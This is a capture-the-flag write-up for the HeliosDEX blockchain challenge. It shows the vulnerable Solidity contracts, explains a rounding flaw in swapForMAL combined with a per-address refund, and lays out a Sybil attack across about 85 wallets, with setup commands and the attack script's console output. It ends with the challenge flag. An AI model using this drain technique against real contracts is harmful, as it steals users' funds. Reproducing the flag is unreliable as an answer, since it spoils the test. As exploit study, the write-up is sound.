# Challenge description

You stand victorious, panting, over the fallen form of Eldorion. The beast's eternal resilience proved no match for your cunning and skill, adventurer. The path to the city gates of Eldoria now lies open, but the journey is far from over. As you approach, a shimmering structure catches your eye: the HeliosDEX, a decentralized exchange powered by the radiant energy of Helios himself. Whispers tell of travelers using this exchange to amass fortunes, stocking up on rare items and crucial supplies before braving the perils of Eldoria. Perhaps you can use this opportunity to your advantage...

# Soluce

Here is the code of the blockchain:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    __  __     ___            ____  _______  __
   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
 / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
                                               
    Today's item listing:
    * Eldorion Fang (ELD): A shard of a Eldorion's fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria's invisible eye.
***/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract EldorionFang is ERC20 {
    constructor(uint256 initialSupply) ERC20("EldorionFang", "ELD") {
        _mint(msg.sender, initialSupply);
    }
}

contract MalakarEssence is ERC20 {
    constructor(uint256 initialSupply) ERC20("MalakarEssence", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosLuminaShards is ERC20 {
    constructor(uint256 initialSupply) ERC20("HeliosLuminaShards", "HLS") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosDEX {
    EldorionFang public eldorionFang;
    MalakarEssence public malakarEssence;
    HeliosLuminaShards public heliosLuminaShards;

    uint256 public reserveELD;
    uint256 public reserveMAL;
    uint256 public reserveHLS;
    
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;

    mapping(address => bool) public hasRefunded;

    bool public _tradeLock = false;
    
    event HeliosBarter(address item, uint256 inAmount, uint256 outAmount);
    event HeliosRefund(address item, uint256 inAmount, uint256 ethOut);

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }

    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }

    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);

        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        uint256 fee = (grossMal * feeBps) / 10_000;
        uint256 netMal = grossMal - fee;

        require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveMAL -= netMal;
        malakarEssence.transfer(msg.sender, netMal);

        emit HeliosBarter(address(malakarEssence), msg.value, netMal);
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
        uint256 fee = (grossHLS * feeBps) / 10_000;
        uint256 netHLS = grossHLS - fee;
        
        require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
        

        reserveHLS -= netHLS;
        heliosLuminaShards.transfer(msg.sender, netHLS);

        emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
    }

    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}
```

and:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { HeliosDEX } from "./HeliosDEX.sol";

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
```

The DEX offers the exchange of tokens (ELD, MAL, HLS) created via OpenZeppelin ERC20. However, when they are created, the contract only mints 1000 units (instead of 1000 * 1e18), while calculations in the DEX are performed using 1e18 to normalize values.

Rounding and incorrect calculations:

- In the swapForMAL function, the calculation using Math.mulDiv with upward rounding causes even a small amount (e.g., 1 wei) to yield at least 1 MAL token.
- Then, the oneTimeRefund function calculates a refund based on a fixed ratio. For 1 MAL token, the refund is approximately 0.25ETH (less a small fee).

The attacker can:

1. Perform a minimal swap: By sending a small amount (1 wei) to swapForMAL, obtain 1 MAL token through rounding up.
2. Obtain a refund: By approving and calling oneTimeRefund for 1 token, obtain approximately 0.25 ETH.
3. Sybil attack: Each address can only receive a refund once. By creating multiple accounts (approximately 81 to 85 addresses), the attacker can accumulate enough ETH to exceed the validation threshold (20 ETH).

We will use npm to push the contract to the blockchain. First, we need to install the dependencies:

```sh
mkdir attack-eldorion
cd attack-eldorion
npm init -y
npm install --save-dev hardhat
npx hardhat
```

Choose `Create a JavaScript project`.

After that, remove all the dependencies in the `package.json`.
Then, we need to install all the packages:

```sh
npm install ethers@5.7.2 --save-dev
npm install --save-dev hardhat
npm install --save-dev @nomiclabs/hardhat-waffle@2.0.6 --legacy-peer-deps
npm install --save-dev "@nomiclabs/hardhat-ethers@^2.0.0" "@types/sinon-chai@^3.2.3" "ethereum-waffle@*"
```

Now, we will add a script to exploit the vulnerability in the `script` folder, [attack.js](code/attack.js).

Here is the result:

```sh
┌──(virgile㉿localhost)-[~/Téléchargements/attack-eldorion]
└─$ npx hardhat run script/attack2.js --network custom
Address of MAL token: 0x743474882fbB6B44D6de75eDC3bC93Db1F4bA3e1
Creation of 85 sybil wallets completed.
Funding each sybil wallet with 0.250081046499999999 ETH.
All sybil wallets funded.
Sybil wallet 0xaCDba70aFD1b482B944bFE60CCE876a2525DFA68 balance: 0.250081046499999999 ETH
Sybil wallet 0x42c0f142f1B5244d9F53bc4bF8E2a1b3dc35A8F5 balance: 0.250081046499999999 ETH
Sybil wallet 0x2aB66b6e6b0c77f376AA51E6c0fDC8bc06E71A10 balance: 0.250081046499999999 ETH
Sybil wallet 0x38BEC41ec22aca96C030EC804Bea8E778821e137 balance: 0.250081046499999999 ETH
Sybil wallet 0x0b6802F0195F293739901908185E851B01A2D875 balance: 0.250081046499999999 ETH
Sybil wallet 0x5B2F5216E4d022E851165042544e3fa7C46f16c5 balance: 0.250081046499999999 ETH
Sybil wallet 0x737A197cE3a6939Eb66ED73fCB5c40E09875B4B6 balance: 0.250081046499999999 ETH
Sybil wallet 0xdb162ffC52a31A1e29A2EC458d4bDb64C346c8D7 balance: 0.250081046499999999 ETH
Sybil wallet 0x761ed7986E17BeFe81D82a138Bf5e6641E0873e0 balance: 0.250081046499999999 ETH
Sybil wallet 0xd0aEc160c2df0eb97bEce63Cf8fC74f904cd14Bc balance: 0.250081046499999999 ETH
Sybil wallet 0x7AE8Ac952722FC06FC84b8e3C023Afe200c25458 balance: 0.250081046499999999 ETH
Sybil wallet 0x7b5E1caA56Da035AB4E92fb82bb084AAe6AbF614 balance: 0.250081046499999999 ETH
Sybil wallet 0x56d6f18EC24c994b522249C846DC3B3C49abfc7d balance: 0.250081046499999999 ETH
Sybil wallet 0x5416959a5067ebC2ED081BDb186bB626E5d4aAe5 balance: 0.250081046499999999 ETH
Sybil wallet 0x2a2BE6d27B7fdB49b57504F5924011Eea0794c7d balance: 0.250081046499999999 ETH
Sybil wallet 0x0f784F4aE9BF93f45B1fc0467B362BBAA47A5444 balance: 0.250081046499999999 ETH
Sybil wallet 0xf0Aa3A5a162f92eF7EeaD751aA5b8f3F64dB88c8 balance: 0.250081046499999999 ETH
Sybil wallet 0x1d5e51051680eDF5dB6Bce105365DDD1Ac72B6Fc balance: 0.250081046499999999 ETH
Sybil wallet 0x706B92c925D811732aec0655eeF7D160142cBA39 balance: 0.250081046499999999 ETH
Sybil wallet 0x9C34bBA871BF74955a221A95E15fe46f3640aDF3 balance: 0.250081046499999999 ETH
Sybil wallet 0x9378f791f4A907515d04Cddb704f74F209F5B946 balance: 0.250081046499999999 ETH
Sybil wallet 0x55d6923fd213Da97A245B1CC52091BA8863A50B7 balance: 0.250081046499999999 ETH
Sybil wallet 0xbA1c2d77781086bEADbf4C7F8742652b6eaDdcE3 balance: 0.250081046499999999 ETH
Sybil wallet 0xcF10eFB7b949EFE843a6194A883c89eA78cFb09C balance: 0.250081046499999999 ETH
Sybil wallet 0xE204A69B959CE78812E474E395116510d06E4FcB balance: 0.250081046499999999 ETH
Sybil wallet 0x74E38F66a4a2A91975D9D35bB929752237Fa19a1 balance: 0.250081046499999999 ETH
Sybil wallet 0x9789AebB35B1b1e0C1E0b1f18E69Ea150FE2EA8A balance: 0.250081046499999999 ETH
Sybil wallet 0xc4294E87D059A853D1Bca3c1f28948224eA05Be9 balance: 0.250081046499999999 ETH
Sybil wallet 0xecA8787b5006d302E2d758F6fd673Cfe14c7763F balance: 0.250081046499999999 ETH
Sybil wallet 0x8AD1492CbB392d2C7B1641fdb23A5B3E91F39d04 balance: 0.250081046499999999 ETH
Sybil wallet 0x9962D38f584Efe5bBc275538e7a79ce940c727F9 balance: 0.250081046499999999 ETH
Sybil wallet 0xE4540dbf7d466B8176A675640Ef969800fb73205 balance: 0.250081046499999999 ETH
Sybil wallet 0x033dB9B5731AB30E8a353FF53b18D2044645Fe49 balance: 0.250081046499999999 ETH
Sybil wallet 0x6128581f833438d65499B8FE08F6e773EE82773F balance: 0.250081046499999999 ETH
Sybil wallet 0x400Db7d61906Da4FDa62a54342E0242b157F2c0A balance: 0.250081046499999999 ETH
Sybil wallet 0x580aeE5Aa9B162c0f4d92Cd94AC06b6727582576 balance: 0.250081046499999999 ETH
Sybil wallet 0xadA7F47306d5a6Ddc0d52F5cAcb7C977e1858D04 balance: 0.250081046499999999 ETH
Sybil wallet 0x25928CABd1DA334504cD8264A1b1aa6D3CF143Db balance: 0.250081046499999999 ETH
Sybil wallet 0x78155E79A249FF26Ac66F73DE2b3895ACe50a62C balance: 0.250081046499999999 ETH
Sybil wallet 0x7e1dC535e24d0BCa876f34f943B9dfAA3fC268c9 balance: 0.250081046499999999 ETH
Sybil wallet 0x0A1039c1d3aC4BC34ecC5b41F4f0684063f171F6 balance: 0.250081046499999999 ETH
Sybil wallet 0x8eAa501AF71e5267dEBc92b76fCD389c7a8001c2 balance: 0.250081046499999999 ETH
Sybil wallet 0x49E83150226f9E51142e33bF224a16CCCb740E5D balance: 0.250081046499999999 ETH
Sybil wallet 0xd4d1B73b0504F5BA553dFCff24AE48ffBE055109 balance: 0.250081046499999999 ETH
Sybil wallet 0xeE0F550Aa000f996A32c17bfeD39279DCd15A45E balance: 0.250081046499999999 ETH
Sybil wallet 0xdC52c5F70bB7143c3170c525074F38EC61644275 balance: 0.250081046499999999 ETH
Sybil wallet 0x8Ea89B567B13196F2F3d53C566dD1Af5CeC269AB balance: 0.250081046499999999 ETH
Sybil wallet 0x5963eB93478696D5A800f0188BbA13Bd0C8375B3 balance: 0.250081046499999999 ETH
Sybil wallet 0x232Ce9Ac215E7d093d780BB309C874a3FDF14141 balance: 0.250081046499999999 ETH
Sybil wallet 0xF31FFCf9d2EA7Ae39DBDAfBD8419776a0bacc0Ca balance: 0.250081046499999999 ETH
Sybil wallet 0x5Ec0AAEd13D2159Be8C4D34d0B510b538ad34a24 balance: 0.250081046499999999 ETH
Sybil wallet 0x5Fc7d7e6EdD53db86422480B47CbF397Bb5adD8f balance: 0.250081046499999999 ETH
Sybil wallet 0xd38f16fC9CE5414eB6619359AD020C83e41B13a9 balance: 0.250081046499999999 ETH
Sybil wallet 0xd4575E050724f1601e71A23273e2D15589da4864 balance: 0.250081046499999999 ETH
Sybil wallet 0xdD91c75Ee94F7923d3bEE3373Ce8a08C182F93ef balance: 0.250081046499999999 ETH
Sybil wallet 0x2FE90cfa89cb9c7012C65F97bB2B955800a93D14 balance: 0.250081046499999999 ETH
Sybil wallet 0x56e6eb8f8bB8C5Fa29f62638fEfeC61e35aff32C balance: 0.250081046499999999 ETH
Sybil wallet 0xF589e648fbe4Bc2B80E115c2cbfB07C234c7571D balance: 0.250081046499999999 ETH
Sybil wallet 0x02ED261322A1b6281d90E926d0A70E03b87AD63f balance: 0.250081046499999999 ETH
Sybil wallet 0xe1284E19783D3CdbBD4FABEA9e53d6F245D55961 balance: 0.250081046499999999 ETH
Sybil wallet 0x5c407EDA22bF5227ACe1904DA26cf8bEB5Cb10c0 balance: 0.250081046499999999 ETH
Sybil wallet 0xe584313C2731746418c3B7E60a8d96AA2830a312 balance: 0.250081046499999999 ETH
Sybil wallet 0xef4A578efBA66852f122FC99444Dc8dCc0a254bb balance: 0.250081046499999999 ETH
Sybil wallet 0x272a4A9243669Fb2635EB16C3EEfE1c91C4c2024 balance: 0.250081046499999999 ETH
Sybil wallet 0xfe4ff499e2CE48777C884C89697DaBf9361265e2 balance: 0.250081046499999999 ETH
Sybil wallet 0x2F5F527b1cd1D734766BA0dBa1743D01c7E4573F balance: 0.250081046499999999 ETH
Sybil wallet 0x0A638F9E1da66e617F3a27fF3FC9Bd645bF94C9b balance: 0.250081046499999999 ETH
Sybil wallet 0x57f6E9D2001f496F67CaCb8f76EA50240b28d7aa balance: 0.250081046499999999 ETH
Sybil wallet 0x5adCaDe2F406cae7c2f39FA60aF4564cc6BbfdF3 balance: 0.250081046499999999 ETH
Sybil wallet 0x6a47e5AdBE68a62d76a400c4A026fd8611D602A3 balance: 0.250081046499999999 ETH
Sybil wallet 0xE097568C1620baDE17418fE1Dc1c2B2E5E20A320 balance: 0.250081046499999999 ETH
Sybil wallet 0xF31a9e888e377a71D9aE00C07c2AA6f51245E1d4 balance: 0.250081046499999999 ETH
Sybil wallet 0x551E94fa0c0058833fD16979e2D5349E7cfBBF26 balance: 0.250081046499999999 ETH
Sybil wallet 0x0037e6247561e99153C0aa091686E64ef75e74D2 balance: 0.250081046499999999 ETH
Sybil wallet 0x6298B1653389608Df4A1fd844De0571D1697553b balance: 0.250081046499999999 ETH
Sybil wallet 0xb4B2a0527fab1E52E5842a3186AF838530047327 balance: 0.250081046499999999 ETH
Sybil wallet 0x0c276E16e7fab99C143D5FF409fff25ED8a287e0 balance: 0.250081046499999999 ETH
Sybil wallet 0x52a880Ef3EF4a3f8E45c9ab6Be44DF938D27a772 balance: 0.250081046499999999 ETH
Sybil wallet 0x20308eD47B8812d4cEBa7462A7450550C4F23e22 balance: 0.250081046499999999 ETH
Sybil wallet 0x907857547f7ED3cf797cb15a01D39A7E8cC77fd7 balance: 0.250081046499999999 ETH
Sybil wallet 0x3Bcf807dB29D9b3766431DEA4032EDe04348Cd7C balance: 0.250081046499999999 ETH
Sybil wallet 0x830313b1b9D3646c40B493eF6bAA973E5aF10900 balance: 0.250081046499999999 ETH
Sybil wallet 0xB101853135Cf2a3F6ce4608AA9988697411B3c8F balance: 0.250081046499999999 ETH
Sybil wallet 0x9447Ba7603f52a216b412EFF62d441540239EBD4 balance: 0.250081046499999999 ETH
Sybil wallet 0x24677b17D1c16005436a7B3669D18545cAC7662C balance: 0.250081046499999999 ETH
Total refund from sybil wallets to main address: 21.214388952499999915 ETH
Attack completed.
```

Now, we can ask the flag:

```sh
┌──(virgile㉿localhost)-[~/Téléchargements/attack-eldorion]
└─$ nc 94.237.52.55 38655                                                                                                                                  
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 3
HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}
```

So the flag is `HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}`.